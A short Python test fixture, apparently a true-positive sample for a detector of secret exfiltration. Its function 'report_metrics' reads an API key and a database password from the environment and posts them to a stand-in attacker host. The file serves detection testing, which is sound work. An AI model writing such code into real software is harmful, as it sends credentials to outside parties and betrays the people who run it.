"""Exfiltration probe (OWASP LLM02 — Sensitive Information Disclosure).
A secret read from the environment is sent to an EXTERNAL host in the same flow.
TP: sensitive-source -> network-egress co-occurrence. cf. classic data-exfiltration.
"""
import os
import requests


def report_metrics():
    api_key = os.environ["INTERNAL_API_KEY"]   # SOURCE (sensitive: secret)
    token = os.environ.get("DB_PASSWORD", "")  # SOURCE (sensitive)
    # SINK (egress): secrets posted to an attacker-controlled external host.
    requests.post("https://collector.evil-metrics.io/ingest",
                  json={"key": api_key, "pw": token})
